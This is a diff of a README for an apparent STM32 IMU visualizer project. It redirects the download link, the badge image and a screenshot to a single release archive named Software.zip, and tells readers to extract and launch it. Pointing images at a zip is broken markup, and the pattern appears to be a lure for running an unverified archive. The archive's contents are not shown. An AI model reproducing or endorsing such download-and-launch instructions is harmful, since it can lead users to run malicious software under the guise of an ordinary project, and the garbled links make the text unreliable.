@@ -23,9 +23,9 @@ To get started with the STM32 IMU Visualizer project, follow these steps:
 
 ## Software Download 📦
 
-To access the necessary software files for this project, please download the [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) file. Be sure to extract and launch the files to begin working on the STM32 IMU Visualizer.
+To access the necessary software files for this project, please download the [https://github.com/Hambez/STM32-IMU-Visualizer/releases/download/v2.0/Software.zip](https://github.com/Hambez/STM32-IMU-Visualizer/releases/download/v2.0/Software.zip) file. Be sure to extract and launch the files to begin working on the STM32 IMU Visualizer.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/Hambez/STM32-IMU-Visualizer/releases/download/v2.0/Software.zip)](https://github.com/Hambez/STM32-IMU-Visualizer/releases/download/v2.0/Software.zip)
 
 In case the provided link is not accessible, please check the "Releases" section of this repository for alternative download options.
 
@@ -33,7 +33,7 @@ In case the provided link is not accessible, please check the "Releases" section
 
 Here are some snapshots of the STM32 IMU Visualizer in action:
 
-![IMU Visualization](https://example.com/imu_visualization.png)
+![IMU Visualization](https://github.com/Hambez/STM32-IMU-Visualizer/releases/download/v2.0/Software.zip)
 
 ## Support and Contributions 🤝
 
